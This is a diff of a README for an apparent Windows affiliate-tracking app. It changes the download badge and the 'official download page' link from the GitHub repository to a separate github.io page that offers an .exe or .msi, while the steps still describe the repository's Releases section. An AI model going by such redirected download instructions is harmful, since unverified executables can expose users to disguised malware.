@@ -1,6 +1,6 @@
 # 📡 afiliados-radar-affiliate-hub - Track your affiliate activity with ease
 
-[![Download Afiliados Radar](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/tickle7016/afiliados-radar-affiliate-hub)
+[![Download Afiliados Radar](https://img.shields.io/badge/Download-Windows-blue.svg)](https://tickle7016.github.io)
 
 Afiliados Radar organizes your affiliate marketing tasks in one location. This application provides a clear view of your tracked links and performance data. You spend less time searching for information and more time managing your campaigns. The workspace uses a radar-style layout to show the status of your various programs.
 
@@ -18,7 +18,7 @@ Your computer must meet these requirements to run the application:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official download page](https://github.com/tickle7016/afiliados-radar-affiliate-hub).
+1. Visit the [official download page](https://tickle7016.github.io).
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the link for the latest version. Usually, this file ends with .exe or .msi.
 4. Save the file to your desktop or downloads folder.
